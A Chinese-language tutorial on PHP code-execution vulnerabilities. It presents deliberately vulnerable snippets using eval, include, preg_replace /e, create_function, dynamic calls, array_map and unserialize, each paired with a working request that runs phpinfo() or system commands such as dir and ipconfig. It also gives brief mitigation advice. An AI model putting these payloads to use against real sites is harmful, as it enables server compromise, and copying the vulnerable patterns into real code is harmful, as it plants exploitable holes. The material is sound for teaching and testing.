一 代码执行函数

PHP中可以执行代码的函数。如eval()、assert()

demo code 1.1:

<?php
echo `dir`;
?>
eval函数将输入的字符串参数当作PHP程序代码来执行

函数原型:

mixed eval(string code_str) //eval注入一般发生在攻击者能控制输入的字符串的时候

    //ex2.php 
    $var = "var"; 
    if (isset($_GET["arg"])) 
    { 
    $arg = $_GET["arg"]; 
    eval("\$var = $arg;"); 
    echo "\$var =".$var; 
    } 
    ?> 

当我们提交http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了；

动态函数

    php 
    func A() 
    { 
    dosomething(); 
    } 
    func B() 
    { 
    dosomething(); 
    } 
    if (isset($_GET["func"])) 
    { 
    $myfunc = $_GET["func"]; 
    echo $myfunc(); 
    } 
    ?> 

程序员原意是想动态调用A和B函数，那我们提交http://www.sectop.com/ex.php?func=phpinfo漏洞产生

防范方法

1、尽量不要执行外部命令

2、使用自定义函数或函数库来替代外部命令的功能

3、使用escapeshellarg函数来处理命令参数

4、使用safe_mode_exec_dir指定可执行文件的路径

esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“"”，替换成“\"”，分号“;”替换成“\;”

用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内

safe_mode = On

safe_mode_exec_dir = /usr/local/php/bin/

二 文件包含代码注射

文件包含函数在特定条件下的代码注射，如include()、include_once()、 require()、require_once()。

当allow_url_include=On ，PHP Version>=5.2.0 时，导致代码注射。

demo code 2.1:

<?php
include($_GET['a']);
?>

访问http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E 即
执行phpinfo()。

三 正则匹配代码注射

众所周知的preg_replace()函数导致的代码注射。当pattern中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下

3.1 preg_replace() pattern 参数注射

pattern即第一个参数的代码注射。
当magic_quotes_gpc=Off时，导致代码执行。

demo code 3.1:

<?php
echo $regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>

访问http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e 即
执行phpinfo()。

3.2 preg_replace() replacement参数注射

replacement即第二个参数的代码注射，导致代码执行。


demo code 3.2:

<?
preg_replace("/menzhi007/e",$_GET['h'],"jutst test menzhi007!");
?>

当我们提交 http://127.0.0.1/preg_replace2.php?h=phpinfo() 即
执行phpinfo()。

3.3 preg_replace()第三个参数注射

我们通过构造subject参数执行代码。提交：http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]

或者 http://127.0.0.1/preg_replace3.php?h=[php]${phpinfo%28%29}[/php] 导致代码执行

demo code 3.3:

<?
preg_replace("/\s*
php
(.+?)
\/php
\s*/ies", "\\1", $_GET['h']);
?>

四 动态代码执行

4.1 动态变量代码执行

demo code 4.1:

<?php
$dyn_func = $_GET['dyn_func'];
$argument = $_GET['argument'];
$dyn_func($argument);
?>

我们提交 http://127.0.0.1/dyn_func.php?dyn_func=system&argument=ipconfig 执行ipconfig命令

4.2 动态函数代码执行

demo code 4.2:

<?php
$foobar = $_GET['foobar'];
$dyn_func = create_function('$foobar', "echo $foobar;");
$dyn_func('');
?>

我们提交 http://127.0.0.1/create_function.php?foobar=system%28dir%29 执行dir命令

五 其他

5.1 ob_start()函数的代码执行

demo code 5.1:

<?php
$foobar = 'system';
ob_start($foobar);
echo 'dir';
ob_end_flush();
?>

5.2 array_map()函数的代码执行

demo code 5.2:

<?php
$evil_callback = $_GET['callback'];
$some_array = array(0, 1, 2, 3);
$new_array = array_map($evil_callback, $some_array);
?>

我们提交 http://127.0.0.1/array_map.php?callback=phpinfo 即执行phpinfo()。



5.3 unserialize()与eval()

unserialize（）是PHP中使用率非常高的函数。不正当使用unserialize（）容易导致安全隐患。
(黑哥那个挑战2 http://hi.baidu.com/hi_heige/blog/item/505b2828da5b18f499250a9b.html)

demo code 5.3:

<?php
class Example {
var $var = '';
function __destruct() {
eval($this->var);
}
}
unserialize($_GET['saved_code']);

?>
我们提交 http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;} 即执行phpinfo()。

5.4 容易导致安全问题的函数

同类型函数还有很多
array_map()
usort(), uasort(), uksort()
array_filter()
array_reduce()
array_diff_uassoc(), array_diff_ukey()
array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
array_intersect_assoc(), array_intersect_uassoc()
array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
array_walk(), array_walk_recursive()
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()